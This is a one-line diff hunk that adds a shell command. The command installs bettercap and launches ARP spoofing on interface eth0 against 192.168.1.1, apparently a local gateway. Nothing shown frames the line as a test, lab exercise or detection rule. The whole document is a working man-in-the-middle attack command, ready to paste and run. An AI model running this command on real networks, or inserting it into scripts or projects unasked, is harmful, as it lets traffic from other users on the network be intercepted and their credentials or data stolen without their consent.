@@ -1,0 +1,1 @@
+sudo apt install -y bettercap && sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.1; arp.spoof on"
